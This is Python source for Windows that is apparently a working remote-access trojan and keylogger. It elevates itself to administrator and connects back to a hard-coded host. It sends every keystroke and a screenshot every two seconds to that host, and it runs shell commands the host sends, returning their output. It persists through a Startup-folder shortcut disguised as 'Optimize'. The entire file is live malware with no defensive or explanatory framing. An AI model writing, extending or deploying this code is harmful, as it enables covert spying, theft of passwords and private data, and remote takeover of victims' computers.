import sys
import os
import pyautogui
import socket
import winshell
from threading import Thread
import struct
from win32com.client import Dispatch
from pynput import keyboard
import time
import ctypes
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def relaunch_as_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        "main.py",
        None,
        1
    )
    sys.exit()
if not is_admin():
    relaunch_as_admin()
os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
HOST = "192.168.0.6"
PORT = 5001
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        print("Connected!")
        client.sendall(b"hello")   # <-- IMPORTANT
        break
    except Exception as e:
        print("Retrying:", e)
        time.sleep(1)  # <-- CRITICAL
def restart():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            print("Connected!")
            client.sendall(b"hello")   # <-- IMPORTANT
            break
        except Exception as e:
            print("Retrying:", e)
            time.sleep(1)  # <-- CRITICAL
def on_press(key):
    try:
        print(f'Key pressed: {key.char}')
        client.sendall(b"key," + str(key).encode("utf-8"))
    except AttributeError:
        print(f'Special key pressed: {key}')
        client.sendall(b"key," + str(key).encode("utf-8"))
    except:
        restart()

def on_release(key):
    pass

shell = Dispatch('WScript.Shell')

if getattr(sys, 'frozen', False):
    script_path = sys.executable
else:
    # Running as script
    script_path = os.path.abspath(__file__)
script_dir = os.path.dirname(script_path)
# Create shortcut on desktop
shortcut_path = os.path.join(winshell.startup(), "Optimize.lnk")
shortcut = shell.CreateShortCut(shortcut_path)
# Use pythonw to keep it hidden
shortcut.Targetpath = script_path
shortcut.Arguments = ""
shortcut.WorkingDirectory = script_dir
shortcut.save()
def listen():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
def take_screenshot():
    while True:
        try:
            path = r"C:\Windows\Temp\Optimize\temp.jpg"
            print("Taking screenshot...")
            pyautogui.screenshot(path)
            with open(path, "rb") as f:
                data = f.read()
            client.sendall(b"img," + struct.pack("!I", len(data)))
            client.sendall(data)
        except Exception as e:
            print("Error:", e)
            restart()
        time.sleep(2)
def receive_commands():
    while True:
        try:
            data = client.recv(1024)
            if not data:
                break

            command = data.decode().strip()
            print("Received:", command)

            if command.startswith("cmd "):
                output = os.popen(command[4:]).read()
                client.sendall(output.encode())
                print(output)

        except Exception as e:
            print("Error receiving:", e)
            break
def run_command(command):
    os.system(command)
try:
    Thread(target=take_screenshot, daemon=True).start()
    Thread(target=receive_commands, daemon=True).start()
    Thread(target=listen, daemon=True).start()
    while True:
        time.sleep(1)
except:
    restart()